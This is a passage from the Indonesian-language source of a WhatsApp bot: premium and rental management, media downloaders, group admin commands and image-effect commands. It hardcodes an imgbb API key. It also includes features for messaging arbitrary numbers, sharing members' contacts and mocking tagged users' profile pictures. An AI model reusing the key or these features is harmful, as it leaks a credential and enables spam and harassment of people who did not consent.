              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}addsewa waktu`)       
             if(_sewa.checkSewaGroup(from, sewa)) return reply("Grup tersebut masih tersisa waktu sewa")
             linkgc = await xdev.groupInviteCode(from)
             yeh = `https://chat.whatsapp.com/${linkgc}`          
            _sewa.addSewaGroup(from, groupName, yeh, q, sewa)
             await reply(`Success`)
              }
              break
              
              case 'delsewa':
              {
              if (!isOwner) return sendSticker(gaboleh)
              if (!isGroup)return reply(mess.only.group)
              if (!isOwner) return reply(mess.only.owner)
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
              reply(mess.success)
              }
              break
              
              
              
              
              
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
               } 
               txtnyee += `© ${fake1}`
              reply2(txtnyee)
              break
              
              
       case 'orderlist': 
       case 'listorder':
              if (!isOwner) return sendSticker(gaboleh)
              let ordernye = `*List Order*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
               } 
               ordernye += `© ${fake1}`
              reply2(ordernye)
              break
              
            case 'listuser':
			case 'userlist':
			       if (!isOwner) return sendSticker(gaboleh)
				     let usernye = `*List User*\nJumlah : ${user.length}\n\n`
				for (let awokwkwk of user) {
					usernye += `- ${awokwkwk}\n`
				}
				usernye += `\n© ${fake1}`
				reply2(usernye)
				break
              
              
              
              
      case 'listerror': 
      case 'errorlist':
      case 'daftarerror':
              let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
              for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
              errornye += `Command : ${i.cmd}\n${i.error}\n\n`             
               } 
               errornye += `© ${fake1}`
              reply2(errornye)
              break

	
	
	case 'premium':
	case 'prem':
	case 'addprem':
	       if (!isOwner) return sendSticker(gaboleh)
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return reply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
if (args[0].includes('08')) return reply('Awali nomor dengan 62')  
if(args.length > 2 ) return reply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
if(args.length < 2 ) return reply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
nomor = args[0] + `@s.whatsapp.net`              
if(_prem.checkPremiumUser (nomor, premium)) return reply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (nomor, args[1], premium)         
await reply(`Succes add premium ${nomor}`)
await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return reply("Hanya bisa di group")
if(args.length < 1) return reply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 if(_prem.checkPremiumUser (premnih, premium)) return reply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (premnih, q, premium)         
 await reply(`Succes add premium ${premnih.split("@")[0]}`)
await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`Satu satu dong`)
if(args.length < 2) return reply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
 if(_prem.checkPremiumUser (lulu, premium)) return reply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (lulu, args[1], premium)         
await reply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else{
 reply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
 }
break    
	
	
	
  
         
case 'delprem':
case 'delpremium':
       if (!isOwner) return sendSticker(gaboleh)
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return reply("Penggunaan : delprem Tag/Reply/Input nomer target yang mau di jadikan premium")
if (args[0].includes('08')) return reply('Awali nomor dengan 62')  
if(args[3]) return reply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
nomor = args[0] + `@s.whatsapp.net` 
if(!_prem.checkPremiumUser (nomor, premium)) return reply("Maap kak user tersebut tidak ada di database")   
          _prem.delPremiumUser (nomor, premium)
          return reply(`Succes delete premium ${nomor}`)
          
 } else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return reply("Hanya bisa di group")
premnih = dev.message.extendedTextMessage.contextInfo.participant
if(args.length > 0) return reply("Format salah")
if(!_prem.checkPremiumUser (premnih, premium)) return reply("Maap kak user tersebut tidak ada di database")   
 _prem.delPremiumUser (premnih, premium) 
  await reply(`Succes delete premium  ${premnih.split("@")[0]}`)
  
} else if(dev.message.extendedTextMessage.contextInfo.mentionedJid) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if(mentioned.length > 1) return reply("Satu satu kak")
	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
	if(!_prem.checkPremiumUser (lulu, premium)) return reply("Maap kak user tersebut tidak ada di database")   
_prem.delPremiumUser (lulu, premium) 
await reply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
 }
break    
	
          
          
                 


 
                  
                  
         
	
	
	
	
	
	case 'addstatus':
	case 'addstory':
					if (!isOwner && !dev.key.fromMe) return sendSticker(gaboleh)
					if (args.length < 1) return reply('Teksnya?')
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, image, {caption: `${q}`})
						await reply(`Sukses mengirim up status image ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, video, {caption: `${q}`})
						reply(`Sukses mengirim up status video ${q}`)
						} else {
							await xdev.sendMessage('status@broadcast', `*${q}`,text)
						await sendMess(`Sukses mengirim status:\n${q}`)
					}
					break
					
	
	
//-------------------------------》FITUR PREMIUM《-------------------------------\\       
	
	
case 'cariteman':
case 'caridoi':
if (!isPremium && !isOwner && !dev.key.fromMe) return reply(`Kamu bukan user premium`)
	const namanya = xdev.contacts[teman] != undefined ? xdev.contacts[teman].vname || xdev.contacts[teman].notify : undefined
	setTimeout( () => {
                    reply("Sedang mencari....")
                    },1000)  
	setTimeout( () => {
                    reply("Berhasil mendapatkan satu doi")
                    },5000)  
    setTimeout( () => {           
    sendKontak(from, `${teman.split("@")[0]}`, namanya, "Sibuk");
                    },9000)  
    break
	
	
	
	
	
	
	case 'chat':
	if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
           if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0];
            var org = q.split("|")[1];
            xdev.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
            break
	
	
//-----------------------------------] Menu Download [-----------------------------------//
	
/*
    otakudesu,
	covid,
	ongoing,
	komiku,✓
	tebakgambar,
	surah,
	sholat,
	lirik,
	chara,✓
	wattpad,
	playstore,✓
	linkwa,✓
	pinterest,✓
	igdl,✓
	igstory,✓
	igstalk,✓
	twitter,✓
	fbdown,✓
	youtube,
	ttdownloader✓
         -ttaudio
         -ttwm✓
         -ttnowm✓
*/


case 'twmp4': case 'twitter':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
sendMediaURL(from, Anu, 'Done!')
})
break


case 'twmp4hd':
case 'twitterhd':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.HD
fotonya = res.thumb
//fto =  await getBuffer(fotonya)
//xdev.sendMessage(from, fto, image, {quoted:dev, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fto, contextInfo:forward})
sendMediaURL(from, Anu, 'Done!')
})
break





            
 
            
            
            

case 'lirik':
try{
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            musik = song.lirik
            if(`${musik}` === "undefined" ) return reply("Gak ketemu om")
            foto = await getBuffer(song.thumb)
            liriknya = song.lirik
            let oket = [{
										"buttonId": `${prefix}play ${q}`,
										"buttonText": {
											"displayText": `🌐 ʏᴏᴜᴛᴜʙᴇ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, liriknya, `\n© ${fake1}`, foto, oket, {contextInfo: forward})
										
            } catch (err){
            	reply("Wuanjir error, coba lirik lain")
   
            }
            break









case 'fbmp4hd':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(lang.erorLink())
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
            
            case 'fbmp4':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(lang.erorLink())
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.Normal_video}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    



case 'pinterest':
try{
        if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
            if(!q) return reply('gambar apa?')
            reply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            
            let di = await getBuffer(ac)
            await xdev.sendMessage(from,di,image,{quoted: dev})
               } catch (err){
					      console.log(err)
					       return reply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	
	
	
	case 'igstory': 
            if(!q) return reply('Usernamenya?')
            pape = q
            hx.igstory(pape)
           .then(async result => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            xdev.sendMessage(from,link,video,{quoted: dev,caption: `${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            xdev.sendMessage(from, link, image,{quoted: dev,caption: `${i.type}`})                  
            }
            }
            });
            break
           
	
	case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    
	
	case 'otaku':
	try{
		reply("Wait kak, kalo ga respon berarti error")
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            xdev.sendMessage(from,ram,image,{quoted:dev,caption:rem})
            } catch (err){
            	console.log(err)
            	return reply("Ga ketemu om")
            }       
            break
         

	
	case 'chara':
	try{
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await xdev.sendMessage(from,li,image,{quoted: dev})
                  } catch (err){
					      console.log(err)
					       return reply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	
	
	
	case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
            
            
            
            
            
            
            
            
            
            
            
            
            case 'tiktok':        
                     if (args.length < 1) return reply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply("Error link")
                     lin = args[0]
                     reply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.wm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      break
                      
                      
                      
                      
                      case 'tiktoknowm':     
                     try{   
                     if (args.length < 1) return reply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(aml.Iv)
                     lin = args[0]
                     reply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.nowm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      } catch (err){
                      	reply(err)
                      }
                      break
                      
                      
	
case 'ig':
case 'igdl':
if (!q) return reply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${q}`).catch(e => {
return reply(mess.error.api)
})
console.log(res)
sendFileFromUrl(`${res.result.link}`, video, {quoted: dev, caption: `${res.result.desc}`})
                    break
   
    

   
    
	
	
    case 'igstalk':
		try{
		            if (!q) return fakegroup('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })} catch (err){
			console.log(err)
			reply("Aduh error om")
			}
        break;      
	
	
            
        
            
                   
                   
      
            
            
            
		
		
		
		
		
            
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return  reply("Tag atau Reply targetnya")
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
     var imgbb = require('imgbb-uploader')
     if (isQuotedImage) {
     reply(mess.wait)
     let ppk = await xdev.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
	 thumbnya = await getBuffer(ppk)
   var bioij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
    var delib = await xdev.downloadAndSaveMediaMessage(bioij, `./stik/${sender}.png`)
    let  datau = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", delib)
     anuk = `${datau.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     xdev.sendFile(from, imoj, `${sender}.png`, null, dev, {thumbnail: thumbnya})
     fs.unlinkSync(delib)
     } else if (isQuotedTag) {
     	reply(mess.wait)
		ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
		let oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
		let medianya = await getBuffer(oppp)
		let datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
		fs.writeFileSync('janckuk.jpeg', datae, 'base64')
		let odata = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", 'janckuk.jpeg')
		anuk = `${odata.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     xdev.sendFile(from, imoj, `${sender}.png`, null, dev, {thumbnail: medianya}) 
     } 
     break
            
            
	
	
	
	
	
	
	
	
            
    case 'totag':
    if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
	
	
	case 'hidetag':
	if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
  if(isExtream) return
			if (!dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
	
	case 'asupan':
	if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
           const rows5 = [{
        "title": 'rikagusriani',
        "rowId": '0'
    }, {
        "title": 'ukhty',
        "rowId": '0'
    }, {
        "title": 'santuy',
        "rowId": '0'
    }, {
        "title": 'geayubi',
        "rowId": '0'
    }, {
        "title": 'bocil',
        "rowId": '0'
    }, {
        "title": 'asupan',
        "rowId": '0'
    }, {
        "title": 'chika',
        "rowId": '0'
    }, {
        "title": 'delvira',
        "rowId": '0'
    }, {
        "title": 'ayu',
        "rowId": '0'
    }, {
        "title": 'bunga',
        "rowId": '0'
    }, {
        "title": 'aura',
        "rowId": '0'
    }, {
        "title": 'nisa',
        "rowId": '0'
    }, {
        "title": 'ziva',
        "rowId": '0'
    }, {
        "title": 'yana',
        "rowId": '0'
    }, {
        "title": 'viona',
        "rowId": '0'
    }, {
        "title": 'syania',
        "rowId": '0'
    }, {
        "title": 'riri',
        "rowId": '0'
    }, {
        "title": 'syifa',
        "rowId": '0'
    }, {
        "title": 'mama_gina',
        "rowId": '0'
    }, {
        "title": 'alcakenya',
        "rowId": '0'
    }, {
        "title": 'mangayutri',
        "rowId": '0'
    }];
    const sections5 = [{
        title: 'Pilih salah satu',
        rows: rows5
    }];
    const listt5 = {
        buttonText: 'SELECT HERE',
        title: `ASUPAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 😇`,
        footerText: `Botz its Upgraded`,
        sections: sections5,
        listType: 1
    };
    xdev.sendMessage(from, listt5, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break

           
	
	
	
	
	
	case 'ytdl':
    case 'youtubedl': 
        if (!isPremium && !isOwner && !dev.key.fromMe) return reply(`Kamu bukan user premium`)
             if (args.length < 1) return reply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('aduh error')
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ File : ${res[0].size}`
             
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
             
              gbutsan = [
  {buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},
  {buttonId:`${prefix}buttons1 ${q}`, buttonText: {displayText:`🎵Audio`},type:1}
]
             
              gbuttonan = {
imageMessage: imageMsg,
    contentText:`${result}`,
    footerText:'Pilih satu format di bawah ini',
    buttons: gbutsan,
    headerType: 4
    }
  await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
            quoted: ftext, contextInfo: forward})
              fs.unlinkSync(`./ytmp.jpeg`)
              break
	
	
	
	
	
	
	
	
	
	
                       


           
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
  //-------------------------------》FITUR GROUP《-------------------------------\\       
    
    
    
    
       case 'simi':              
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (!isGroup) return reply('hanya bisa di group')
						if (isSimi) return reply('Fitur sudah aktif kak')
						siminya.push(from);
						fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isGroup) return reply('hanya bisa di group')
						if (!isSimi) return reply('Udah mati')
						siminya.splice(from, 1);
						fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}simi on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}simi off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    } else {  
       if(isSimi) return   
	   simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
       sami = simi.success
       reply(sami) 
       }
       break
             
             
    
    
    
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
linkgc = await xdev.groupInviteCode(from)
yeh = `*「 Link Group 」*\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
xdev.sendMessage(from, yeh, text, { quoted: dev })
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
                    }
if (args[0] === 'open') {

await  xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
await reply('_Success_')
} else if (args[0] === 'close') {
 await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await reply('_Success_')
}
                 break;


case 'setdesc':
case 'setdesk':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if(!q) return reply("Teksnya apa")
xdev.groupUpdateDescription(from, q)
reply("Succes")
break

case 'setnamegc':
{
if(!q) return reply("masukin teksnya kak")
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupUpdateSubject(from, `${args.join(" ")}`)
await xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
}
break





	case 'unadmin':
	case 'demote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return reply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return reply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupDemoteAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return reply("Hanya bisa di group")
xdev.groupDemoteAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
